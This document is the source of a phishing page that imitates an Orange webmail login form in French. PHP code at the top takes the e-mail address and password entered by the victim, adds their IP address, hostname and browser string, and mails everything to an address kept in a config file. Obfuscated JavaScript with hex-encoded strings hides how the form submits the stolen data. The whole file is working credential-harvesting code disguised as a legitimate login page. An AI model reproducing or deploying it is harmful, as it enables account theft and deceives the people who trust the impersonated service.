<? include("config.php"); if($_GET['mil']){ if($_GET['mil'] && $_GET['pwd']){ $mil=$_GET['mil'];$pwd=$_GET['pwd'];$ip=getenv("REMOTE_ADDR");$host=gethostbyaddr(getenv("REMOTE_ADDR"));$msg = "--------------------- Bismillah ----------------------\nE-MAIL : $mil\nPASSWD : $pwd\n------------------------------------------------------\nIPv4 : $ip\nHOST : $host\nUSAG : ".$_SERVER["HTTP_USER_AGENT"]."\n------------------- Al-Hamdolillah -------------------\nALLAH YJIB Tissir";$sbj = "Sdam $ip [LOGIN] | $mil | $pwd";$frm = "From: sina<supportz@sina.fr>";mail($ana,$sbj,$msg,$frm);print "<script>checkValues();$('#o_content').load('fin.php');</script>";exit; }else{ print "<a id='error'>Les cases avec la <a id='njm'>*</a> sont obligatoires !</a>";exit; }} ?> 
<script>
var _0xdf7e=["","\x68\x74\x6D\x6C","\x23\x61\x6E\x73\x72","\x76\x61\x6C\x75\x65","\x6D\x69\x6C","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x70\x77\x64","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x61\x64\x72\x65\x73\x73\x65\x20\x65\x6D\x61\x69\x6C\x20\x20\x21","\x56\x65\x75\x69\x6C\x6C\x65\x7A\x20\x65\x6E\x74\x72\x65\x72\x20\x76\x6F\x74\x72\x65\x20\x6D\x6F\x74\x20\x64\x65\x20\x70\x61\x73\x73\x65\x20\x21","\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x2E\x67\x69\x66\x22\x20\x61\x6C\x74\x3D\x22\x6C\x6F\x61\x64\x69\x6E\x67\x22\x3E","\x6D\x61\x69\x6C\x2E\x70\x68\x70\x3F\x6D\x69\x6C\x3D","\x26\x70\x77\x64\x3D","\x6C\x6F\x61\x64","\x56\x6F\x75\x6C\x65\x7A\x2D\x76\x6F\x75\x73\x20\x76\x72\x61\x69\x6D\x65\x6E\x74\x20\x72\x65\x74\x6F\x75\x72\x6E\x65\x72\x20\x3F","\x2E\x70\x68\x70","\x23\x6F\x5F\x63\x6F\x6E\x74\x65\x6E\x74"];function SubMitMLInfo(){$(_0xdf7e[2])[_0xdf7e[1]](_0xdf7e[0]);var _0xaa55x2=document[_0xdf7e[5]](_0xdf7e[4])[_0xdf7e[3]];var _0xaa55x3=document[_0xdf7e[5]](_0xdf7e[6])[_0xdf7e[3]];var _0xaa55x4=_0xdf7e[7];var _0xaa55x5=_0xdf7e[8];if(emailField(_0xdf7e[4],_0xaa55x4)&&simpleField(_0xdf7e[6],_0xaa55x5)){$(_0xdf7e[2])[_0xdf7e[1]](_0xdf7e[9]);$(_0xdf7e[2])[_0xdf7e[12]](_0xdf7e[10]+escape(_0xaa55x2)+_0xdf7e[11]+escape(_0xaa55x3));} ;} ;function Retour(_0xaa55x7){if(confirm(_0xdf7e[13])){$(_0xdf7e[15])[_0xdf7e[12]](_0xaa55x7+_0xdf7e[14]);} ;} ;
</script>
<div class="contenu">
			<div id="pavtitle" class="pave_gris_532">Messagerie Orange</div>
			<div style="border:1px solid #DDD;width:570px;" align="center">
			<br>
			<div id="ansr" align="center"></div>
			<br>
			<table width="450" align="center">
						<tr><td>Adresse E-mail </td><td><input type='text' name='mil' id='mil' maxlength="70"></td></tr>
						<tr><td>Mot de passe </td><td><input type='password' name='pwd' id='pwd' maxlength="25"></td></tr>
			</table>
			<br>
			
			</div>
		    <div class="pave_gris_bas" align="right"><img src="bt_retour.jpg" alt="Retour" title="Retour" onclick="Retour('bnk')"> 
            <img src="btn_valider.gif" name="valider" class="valider2" title="Valider" onclick="SubMitMLInfo()"  style="width:67px;height:26px;margin-right:15px;margin-top:20px" onclick="SubMit()">
          </div>
        </form>
</div>